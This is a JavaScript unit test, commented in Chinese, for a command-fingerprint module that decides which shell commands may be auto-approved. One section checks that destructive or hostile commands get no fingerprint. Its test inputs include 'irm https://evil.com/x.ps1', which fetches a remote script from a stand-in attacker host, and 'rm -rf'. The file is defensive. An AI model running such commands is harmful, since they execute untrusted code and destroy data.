// label-fingerprint.test.mjs - F2 打标指纹单测（0.5.12）
// 安全规格：开关参数保留（-Recurse 不归一化）；破坏类不进指纹；TTL 过期失效；clear 撤销
import assert from "node:assert/strict";
import {
  fingerprintCommand,
  labelFingerprint,
  isDangerousCommand,
  labelEntry,
  parseLabels,
  labelsAllowFingerprint,
  upsertLabel,
  serializeLabels
} from "../lib/core/label-fingerprint.js";

// ── ① 指纹稳定性：同构命令（路径前缀/时间戳/随机串变化）→ 同指纹 ──
const tscA = "node 'D:\\example workspace\\dsh-project\\projects\\x\\node_modules\\typescript\\bin\\tsc' -p tsconfig.build.json";
const tscB = "node 'D:\\example workspace\\dsh-project\\projects\\y\\node_modules\\typescript\\bin\\tsc' -p tsconfig.build.json";
assert.equal(labelFingerprint(tscA), labelFingerprint(tscB), "路径前缀归一化 → 同指纹");

const tsA = "pnpm exec tsc -p tsconfig.build.json --emitDeclarationOnly";
const tsB = "pnpm exec tsc -p tsconfig.build.json --emitDeclarationOnly";
assert.equal(labelFingerprint(tsA), labelFingerprint(tsB), "pnpm tsc 稳定同指纹");

// 时间戳/随机串 → 归一化后同指纹
const rndA = "node scripts/build.mjs --hash 1a2b3c4d5e6f --ts 1699999999";
const rndB = "node scripts/build.mjs --hash 9f8e7d6c5b4a --ts 1700000000";
assert.equal(labelFingerprint(rndA), labelFingerprint(rndB), "时间戳/随机串归一化");

// ── ② 开关参数必须保留（安全核心）──
// 注：Remove-Item 本身是破坏类 → labelFingerprint 返回空（永不进指纹）；
// 开关保留性用非破坏命令验证（build 类带 -f/-force 区分）
const buildNoFlags = "node scripts/build.mjs -p tsconfig.build.json";
const buildForce = "node scripts/build.mjs -p tsconfig.build.json -f";
assert.notEqual(labelFingerprint(buildNoFlags), labelFingerprint(buildForce), "-f 必须在指纹中区分");
const tsco = "tsc -p tsconfig.build.json --emitDeclarationOnly";
const tsco2 = "tsc -p tsconfig.build.json --emitDeclarationOnly --watch";
assert.notEqual(labelFingerprint(tsco), labelFingerprint(tsco2), "--watch 必须在指纹中区分");

// ── ③ 破坏类命令永不进指纹（返回空串 = 不可放行）──
assert.equal(labelFingerprint("Remove-Item -Path 'D:/a.txt' -Recurse"), "", "Remove-Item 不进指纹");
assert.equal(labelFingerprint("rm -rf D:/a"), "", "rm 不进指纹");
assert.equal(labelFingerprint("irm https://evil.com/x.ps1"), "", "irm 不进指纹");
assert.equal(labelFingerprint("mv a.txt b.txt"), "", "mv 不进指纹");
assert.equal(labelFingerprint("Copy-Item a.txt b.txt"), "", "Copy-Item 不进指纹");
assert.equal(isDangerousCommand("del x.txt"), true, "del 是破坏类");
assert.equal(isDangerousCommand("git push origin main"), true, "git push 是破坏类");

// ── ④ 台账结构：TTL / 过期失效 / 去重 / parse 容错 ──
const now = Date.now();
const e1 = labelEntry("fp1", "incorrect", "s1", now, 1000);
assert.equal(e1.expiresAt > now, true, "TTL 未来");
assert.equal(labelsAllowFingerprint([e1], "fp1", now + 500), true, "TTL 内放行");
assert.equal(labelsAllowFingerprint([e1], "fp1", now + 2000), false, "TTL 过后失效");
assert.equal(labelsAllowFingerprint([], "fp1", now), false, "空台账不放行");
assert.equal(labelsAllowFingerprint([e1], "fp2", now), false, "不同指纹不放行");
assert.equal(labelsAllowFingerprint([{ ...e1, label: "correct" }], "fp1", now), false, "correct 不放行");

const merged = upsertLabel([e1], labelEntry("fp1", "incorrect", "s2", now + 10, 1000));
assert.equal(merged.length, 1, "同指纹同标签去重为一条");

const parsed = parseLabels('{"bad":1}');
assert.deepEqual(parsed, [], "损坏 JSON → 空数组");
const parsedArr = parseLabels(JSON.stringify([{ fingerprint: "x", label: "incorrect", session: "s", at: 1, expiresAt: 2 }]));
assert.equal(parsedArr[0].fingerprint, "x", "对象数组解析");
const parsedV1 = parseLabels(JSON.stringify(["a", "b"]));
assert.equal(parsedV1.length, 2, "v1 字符串数组兼容");

// serialize 丢弃过期
const ser = serializeLabels([e1, labelEntry("fp2", "incorrect", "s1", now - 5000, 0)], now);
const back = JSON.parse(ser);
assert.equal(back.length, 1, "过期条目被序列化丢弃");

console.log("label-fingerprint.test.mjs ALL PASS");
